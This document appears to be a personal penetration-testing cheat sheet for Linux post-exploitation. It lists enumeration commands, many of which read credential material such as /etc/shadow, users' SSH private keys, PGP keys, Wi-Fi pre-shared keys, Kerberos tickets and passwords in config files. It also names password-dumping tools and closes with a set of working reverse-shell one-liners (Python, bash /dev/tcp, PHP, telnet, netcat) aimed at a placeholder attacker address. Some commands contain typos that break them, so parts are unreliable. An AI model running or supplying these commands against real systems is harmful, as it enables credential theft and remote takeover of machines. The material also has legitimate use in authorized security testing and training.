# ------------------------------- start overview on enumeration ------------------------------- # 
    ==> Quick view: during post-exploitation, we're gathering information from our
    exploited machine(s), the info. gathered to givve us the situational awareness
    that is needed to better understand and futher exploit the environment we're in.
    two higher information gathered categories:
        - Network information
        - System information

    # ---------- Network information ---------- #
        ==> Quick view: answered on important question:
            - how is the exploited machine compromised machine to the network? 
            - is the machine multi-homed?
            - can we pivot to other hots in other segments?
            - do we have unfettered outbound connectivity or egress traffic limited to certian ports or protocols?
            - is there a firewall betwene compromised machine and other machines?
            - is compromised machine communicating with other hosts? purpose or function of the hosts?
            - what protocols that used?
            - are other machines initiating a connection with compromised host?
    
    # ---------- system information ---------- #
        ==> Quick view: we got information like:
            - OS and kernel.
            - environment variables.
            - interesting files and sensitive inforamtion.
            - users, groups, permissions and privileges.
            - services and associated configuration files.
            - cron jobs, system tasks.
            - installed applications and versions.
            - running processes.
# -------------------------------   end overview on enumeration ------------------------------- # 

# ------------------------------- start enumeration ------------------------------- # 
    # ---------- start network enumeration manually ---------- #
        1st: ifconfig -a
            ==> explanation: # retreive interfaces and IPs.
        2nd: route -n
            ==> explanation: # retreive static routes and gateways.
        3rd: traceroute -n <ip_address>
            ==> explanation: # know how many hops are between our compromised machine and other network segments.
        4th: cat /etc/resolv.conf
            ==> explanation: # get DNS server infomation.
        5th: arp -en
            ==> explanation: # ARP cache.
        6th: netstat -auntp
            ==> explanation: # lsit all tcp and udp connection over the machine.
            ss -twurp
            ==> explanation: # ss tool alternative to netstat
        7th: nmap -sT -p<port_range> portquiz.net
            ==> explanation: # check outbound connectivity status.
        8th: ip xfrm state list
            ==> explanation: Print IPSEC VPN Keys (requires root)
        9th: iptables -L -n
            ==> explanation: Iptables Rules (requires root)
    # ----------   end network enumeration manually ---------- #
    
    # ---------- start system enumeration manually ---------- #
        # ---------- start users and group ---------- #
            id
                ==> explanation: # current user inforamtion.
            sudo -l
                ==> current user executae anything with elevated privilege.
            grep $USER /etc/passwd
                ==> explanation: # current user information from /etc/passwd
            lastlog
                ==> explanation: # most recent logins.
            w
            who
                ==> explanation: # who is currently onto system.
            grep $USER /etc/passwd | cut -f6 -d”:”
                ==> explanation: Home Directory
            last
                ==> explanation: # last logged on users.
            for user in $(cat /etc/passwd | cat -f1 -d":") do id $user; done
                ==> explanation: # all users including UID and GID inforamtion
            cat /etc/passwd | cut -f1,3,4 -d":" | grep "0:0" | cut -f1 -d":" | awk '{print $1}'
                ==> explanation: # list all UID 0 (root) accounts
            cat /etc/shadow
                ==> explanation: check hashes for users.
            cat /etc/group
                ==> explanation: retreive groups 
        # ----------   end users and group ---------- #
        
        # ---------- start applications/services and versions ---------- #
            sudo -l | grep vim
            sudo -l | grep vi
            sudo -l | grep nmap
            sudo -l |grep python
            sudo -l |grep irb
                ==> explanation: # sudo known binaries that allow break out into a shell
            dpkg -l
                ==> explanation: list installed packages.
            sudo -V |grep “Sudo version”
                ==> explanation: Get sudo Version
            sudo -V 
            httpd -v
            apache2 -v
            mysql -V
            sendmail -d01
            couchdb -V
            psql -V

                ==> explanation: # common software versions.
            ls -al /etc/init.d/
                ==> explanation: List Inetd Services.
            ls -al /etc/xinetd.d/
                ==> explanation: List xinetd Services.
            cat /etc/xinetd.d/*
                ==> explanation: Contents of Xinetd.
            find /etc/init.d/ ! -uid 0 -type f 2>/dev/null |xargs ls -la
                ==> explanation: Find services in /etc/init.d not owned by root and list their permissions.
            service --status-all
                ==> explanation: FList Running Services (Debian/CentOS/Redhat/Ubuntu).
            service --status-all
                ==> explanation: Print status of all services (Debian/CentOS)
            service nginx status
                ==> explanation: Print the status of a service.
            chkconfig --list
                ==> explanation: List Known Services (SysV)
            systemctl list-unit-files
                ==> explanation: List all Systemd services (Debian/CentOS/Redhat)
        # ----------   end applications/services and versions ---------- #
        
        # ---------- start OS and running processes ---------- #
            uname -a
                ==> explanation: # kernel version.
            lsmod
                ==> explanation: Loaded Kernel Modules
            dmesg -T
                ==> explanation: Kernel Messages (With Timestamp)
            cat /etc/issue
                ==> explanation: check current OS have any exploitable vulnearbilities.
            echo $PATH
                ==> explanation: # current $PATH environment variable.
            hostname
                ==> explanation: retreive the hostname reveal anything about the systems' funciton.
            ps aux
                ==> explanation: # running processes.
            ps auxw | awk '{print $1}' | xargrs -r ls -la 2> /dev/null | awk '!x[$0]++'
            ps -ef
                ==> print process binraries/path and permssions.
            lsof -n
                ==> explanation: # list open files.
            lspci
                ==> explanation: Loaded PCI Devices
            lsusb
                ==> explanation: Loaded USB Devices
            cat /proc/cpuinfo
                ==> explanation: CPU Information
            cat /proc/meminfo
                ==> explanation: Memory
            lshw
                ==> explanation: Hardware Information      
        # ----------   end OS and running processes ---------- #
        
        # ---------- start directories, files and permissions  ---------- #
            cat /etc/sudoers
                ==> Read /etc/sudoers
            find / -perm -4000 -type f 2> /dev/null
                ==> explanation: # find SUID files.
            find / -uid 0 -perm -4000 -type f 2> /dev/null
                ==> explanation: find SUID files owned by root.
            find / -perm -2000 -type f 2> /dev/null
                ==> explanation: # find GUID files.
            find / -perm -2 -type f 2> /dev/null
                ==> explanation: # find world-writable files.
            ls -als /home/*/.ssh
                ==> explanation: Check for access to users’ .ssh directories
            ls -als /root/
                ==> explanation: list root's home directory.
            ls -als /root/.*
                ==> explanation: Check permissions of root’s .bashrc and other dot files/directories.
            ls -als /etc/*.conf
                ==> explanation: list all conf files in /etc/
            find / -name *.conf 2> /dev/null
                    ==> explanation: Find all .conf Files
            find / -user <username>
                ==> explanation: find all file that owned by username
            find / -user <username> -name “*.sh”
                ==> explanation: find specific files that owned by username
            find /* -name *.*history* -print 2> /dev/null
                ==> explanation: read other users' history files.
            find / -group <group>
                ==> Find Files Owned By A Particular Group
            df -h
            mount
                ==> explanation: Mounted File Systems
        # ----------   end directories, files and permissions ---------- #
        
        # ---------- start jobs and tasks ---------- #
            cat /etc/crontab
            ls -als /etc/cron*
                ==> explanation: list all cron jobs.
            find /etc/cron* -type -f -perm -o+w -exce ls -l {} \;
                ==> explanation: find world-witeable cron jobs.
            find /etc/cron* -user <username>
                ==> explanation: Find Cron Jobs Owned by Other Users.
        # ----------   end jobs and tasks ---------- #
        
        # ---------- start sensitive information ---------- #
            grep 'password' /etc/*.conf 2> /devl/null
                ==> read configuration files that might contain sensitive information.
            grep pass* /etc/*conf
                ==> explanation: # find conf files that contains the strings "pass*"
            cat /var/log/apache/access.log
            cat /var/log/apache2/access.log
            cat /var/log/nginx/access.log
                ==> explanation: Check readability of apache/nginx access log
            cat /var/log/apache/access.log |grep -E “^user|^pass”
                ==> explanation: Search for “user” and “pass” string in Apache Access Log
            cat /etc/NetworkManager/system-connections/* |grep -E “^id|^psk”
                ==> explanation: Dump Wireless Pre-Shared Keys from NetworkManager Configuration
            cat /home/*/.gnupg/secrings.gpgs
                ==> explanation: PGP Keys
            cat /home/*/.ssh/id*
                ==> explanation: SSH Keys
            getent passwd
                ==> explanation: Show any LDAP, Local or NIS Accounts
            pdbedit -L -w
            pdbedit -L -v
                ==> explanation: Dump Samba user Database Information
            cat /tmp/krb*
                ==> explanation: Kerberos Tickets
            cat /etc/syslog.conf
                ==> explanation: Syslog Configuration
            cat /etc/samba/smb.conf
                ==> explanation: Samba Configuration
            cat /etc/mysql/my.cnf
                ==> explanation: MySQL Configuration
            cat /etc/openldap/ldap.conf
                ==> explanation: OpenLDAP Configuration
            cat /etc/exports
                ==> explanation: NFS Exports
            cat /etc/inetd.conf
                ==> explanation: Inetd Configuration
            cat /etc/rsyslog.conf
            cat /etc/rsyslog.d/*
                ==> explanation: Rsyslog Configuration
            cat /etc/apache2/apache2.conf
                ==> explanation: Apache2 Configuration
            cat /etc/httpd.conf
                ==> explanation: Httpd configuration
        # ----------   end sensitive information ---------- #
    # ----------   end system enumeration manually ---------- #
    
    # ---------- start automated enumeration ---------- #
        # ---------- |Tools| ---------- #
            - LinEnum: https://github.com/rebootuser/LinEnum
                ==> Quick View: automated inforamtion gathering tool.
            - LinuxPrivChecker: https://github.com/sleventyeleven/linuxprivchecker
                ==> Quick View: using for checking for privilege escalation methods.
            - unix-privesc-check: http://pentestmonkey.net/tools/audit/unix-privesc-check
                ==> Quick View: finding common misconfigurations which can help us elevate
                our privileges on a linux based system.
            - mimipenguin: https://github.com/huntergregal/mimipenguin
                ==> Quick View: dump the login password from the current linux desktop user. Adapted from the idea
                behind the popular Windows tool mimikatz. done during post-exploitation.
            - metasploit: post/linux/gather/enum_configs
                ==> explanation: download configuration files.
            - metasploit: enym_system
                ==> explanation: gather linux version, usre accounts, installed packages, cron jobs and more.
    # ----------   end automated enumeration ---------- #
# -------------------------------   end enumeration ------------------------------- # 

# ------------------------------- start reverse shell ------------------------------- # 
    Python
        python -c 'import
        socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.con
        nect(("<attacker_IP>",<attacker_PORT>));os.dup2(s.fileno(),0);
        os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-
        i"]);'

    bash
        bash -i >& /dev/tcp/<attacker_IP>/<attacker_PORT> 0>&1

    php
        php -r ‘$sock=fsockopen(“<attacker_IP>”,<attacker_PORT>); exec(“/bin/sh -I
        <&3 >&3 2>&3”);’

    telnet
        telnet <attacker_IP> 4444 | /bin/bash | telnet <attacker_IP> 4445

    netcat
        nc <attacker_IP> <attacker_PORT> -e /bin/sh

    netcat w/o “-e” option
        rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -I 2>&1 | nc <attacker_IP>
        <attacker_PORT> > /tmp/f
# -------------------------------   end reverse shell ------------------------------- # 